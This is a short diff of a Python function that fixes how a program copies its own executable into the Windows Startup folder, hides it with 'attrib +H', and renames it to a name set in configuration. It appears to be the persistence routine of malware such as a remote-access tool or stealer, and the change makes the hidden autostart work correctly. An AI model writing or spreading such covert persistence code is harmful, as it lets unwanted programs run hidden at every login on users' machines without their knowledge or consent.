@@ -11,13 +11,13 @@ def set_startup():
         print("skipping enable startup")
         return
     
-    file_name = os.path.dirname(sys.executable)
+    file_name = sys.executable.split("\\")[-1]
     print(file_name)
-    if(file_name == "startup.py"):
+    if(file_name == "python.exe"):
         print("skipping enable startup because of debug")
         return
     startup_path = expanduser(r'~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup')
-    shutil.copy2(file_name, startup_path)
+    shutil.copy2(sys.executable, startup_path)
     file_path = os.path.join(startup_path, file_name)
     os.system(f"attrib +H {file_path}")
     os.rename(file_path, os.path.join(startup_path, cfg_data["autoStartupName"] + ".exe"))
